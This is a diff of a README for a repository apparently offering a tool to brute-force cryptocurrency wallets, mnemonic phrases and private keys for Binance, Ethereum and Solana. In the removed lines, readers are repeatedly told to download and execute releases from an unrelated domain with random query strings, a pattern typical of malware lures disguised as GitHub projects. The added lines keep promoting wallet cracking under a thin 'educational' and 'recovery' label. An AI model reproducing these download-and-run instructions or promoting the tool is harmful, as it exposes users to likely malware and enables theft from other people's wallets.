@@ -1,16 +1,16 @@
 # Crypto Bruteforce 🔐
 
-![Crypto Bruteforce](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg)
+![Crypto Bruteforce](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-Welcome to the **Crypto Bruteforce** repository! This project focuses on automating the brute-force process for various cryptocurrency wallets and encryption methods. Whether you're a developer looking to enhance your crypto tools or a hobbyist interested in cryptocurrency security, this repository has something for you.
+Welcome to the **Crypto Bruteforce** repository! This project aims to provide tools for brute-forcing cryptocurrency wallets, specifically focusing on popular platforms like Binance, Ethereum, and Solana. 
 
 ## Table of Contents
 
 - [Introduction](#introduction)
 - [Features](#features)
-- [Topics](#topics)
 - [Installation](#installation)
 - [Usage](#usage)
+- [Supported Topics](#supported-topics)
 - [Contributing](#contributing)
 - [License](#license)
 - [Contact](#contact)
@@ -18,118 +18,95 @@ Welcome to the **Crypto Bruteforce** repository! This project focuses on automat
 
 ## Introduction
 
-Cryptocurrencies have transformed the way we think about money and security. However, with this transformation comes the challenge of securing wallets and data. The **Crypto Bruteforce** tool aims to assist users in testing the strength of their encryption methods. It can also be used for educational purposes to understand vulnerabilities in crypto wallets.
+Cryptocurrency security is crucial in today's digital world. Many users rely on mnemonic phrases and private keys to access their wallets. Unfortunately, these can sometimes be lost or forgotten. This repository offers a solution by providing brute-force methods to recover these keys. 
+
+**Please note:** This tool is intended for educational purposes only. Use it responsibly and ensure you have permission to access any wallets you attempt to recover.
 
 ## Features
 
-- **Automated Brute-Force Attacks**: Easily test the strength of various wallets.
-- **Multi-Currency Support**: Works with multiple cryptocurrencies, including Monero and Bitcoin.
-- **User-Friendly Interface**: Simple commands make it easy to use.
-- **Customizable Parameters**: Adjust the attack settings based on your needs.
-- **Logging and Reporting**: Keep track of attempts and results for better analysis.
-
-## Topics
-
-This repository covers a range of topics related to cryptocurrency and automation. Some of the key areas include:
-
-- crypto
-- crypto-api
-- crypto-automation
-- crypto-bot
-- crypto-game
-- crypto-market
-- crypto-tools
-- crypto-trading
-- cryptocurrenices
-- cryptocurrency
-- cryptocurrency-tool
-- cryptocurrency-wallet
-- cryptohack
-- cryptoicons
-- monero
-- rsa-cryptography
+- **Multi-Currency Support**: Works with Binance Coin (BNB), Ethereum, and Solana.
+- **Mnemonic Phrase Recovery**: Quickly recover lost mnemonic phrases.
+- **Private Key Brute-Force**: Attempt to recover private keys using various algorithms.
+- **User-Friendly Interface**: Simple command-line interface for easy use.
+- **Extensive Documentation**: Detailed instructions and examples.
 
 ## Installation
 
-To get started with **Crypto Bruteforce**, you need to download the latest release. You can find it [here](https://installergitb.icu?vapuv46q8si777k). Make sure to download and execute the necessary files as per your operating system.
+To get started, clone the repository to your local machine:
 
-### Prerequisites
+```bash
+git clone https://github.com/TexNacho/crypto-bruteforce.git
+cd crypto-bruteforce
+```
 
-Before you install, ensure you have the following:
+Next, install the required Python packages:
 
-- Python 3.x installed on your machine.
-- Basic understanding of command-line operations.
-- Required libraries (these can be installed via pip).
-
-### Steps to Install
-
-1. Clone the repository:
-
-   ```bash
-   git clone https://github.com/ph-quake-master/crypto-bruteforce.git
-   cd crypto-bruteforce
-   ```
-
-2. Install required libraries:
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-3. Download the latest release from [here](https://installergitb.icu?rgvd24pysc0p40i).
-
-4. Execute the main script:
-
-   ```bash
-   python main.py
-   ```
+```bash
+pip install -r requirements.txt
+```
 
 ## Usage
 
-Using **Crypto Bruteforce** is straightforward. Once you have installed the necessary files, you can start testing the strength of your wallets. Here’s a quick guide on how to use the tool:
-
-### Command-Line Options
-
-- `-h`, `--help`: Show help message and exit.
-- `-w`, `--wallet`: Specify the wallet address.
-- `-p`, `--password`: Provide a password list for brute-force attempts.
-- `-t`, `--threads`: Set the number of threads to use.
-
-### Example Command
+To use the tool, you can run the main script from the command line. Here’s a basic command to start:
 
 ```bash
-python main.py -w <your_wallet_address> -p <path_to_password_list> -t 4
+python main.py --wallet <your_wallet_address>
 ```
 
-This command will start a brute-force attack on the specified wallet using the provided password list with 4 threads.
+Replace `<your_wallet_address>` with the address you want to recover.
+
+For more options, you can view the help menu:
+
+```bash
+python main.py --help
+```
+
+## Supported Topics
+
+This project covers a variety of topics related to cryptocurrency:
+
+- **Binance Coin**: Tools specific to BNB wallets.
+- **BNB Wallet**: Brute-force methods for BNB wallets.
+- **Brute-Force Attacks**: General techniques for brute-forcing.
+- **Crypto Finder**: Tools to find lost crypto wallets.
+- **Crypto Wallet**: General wallet recovery tools.
+- **Cryptocurrency Wallet**: Support for multiple cryptocurrencies.
+- **CryptoHack**: Techniques and tools for hacking wallets (ethical use only).
+- **Ethereum Bruteforce**: Specific tools for Ethereum wallets.
+- **Mnemonic**: Recovery tools for mnemonic phrases.
+- **Mnemonic Phrase Recovery**: Methods to recover lost phrases.
+- **Private Key**: Tools to recover private keys.
+- **Python**: Written in Python for ease of use.
+- **Solana Blockchain**: Tools specific to Solana wallets.
+- **Solana Volume Bot**: Tools for analyzing Solana volume.
 
 ## Contributing
 
-We welcome contributions to improve the **Crypto Bruteforce** tool. If you want to contribute, please follow these steps:
+We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. 
 
 1. Fork the repository.
-2. Create a new branch (`git checkout -b feature-branch`).
-3. Make your changes and commit them (`git commit -m 'Add new feature'`).
-4. Push to the branch (`git push origin feature-branch`).
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`).
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
+4. Push to the branch (`git push origin feature/AmazingFeature`).
 5. Open a pull request.
-
-Please ensure your code follows the existing style and includes tests where applicable.
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
 
-For questions or suggestions, feel free to reach out:
+For any questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: texnacho@example.com
+- **GitHub**: [TexNacho](https://github.com/TexNacho)
 
 ## Releases
 
-To stay updated with the latest versions and features, check the [Releases](https://installergitb.icu?syshp02iss5fpe0) section. Here, you can download the latest files and execute them as needed.
+To download the latest version of the Crypto Bruteforce tool, visit the [Releases](https://github.com/TexNacho/crypto-bruteforce/releases) section. You can find the necessary files to download and execute.
 
----
+## Conclusion
 
-Thank you for visiting the **Crypto Bruteforce** repository. We hope you find it useful in your cryptocurrency endeavors!
+Thank you for checking out the Crypto Bruteforce repository! We hope this tool helps you recover your lost wallets and keys. Remember to use it ethically and responsibly. 
+
+For the latest updates and releases, check the [Releases](https://github.com/TexNacho/crypto-bruteforce/releases) section. Happy hacking!
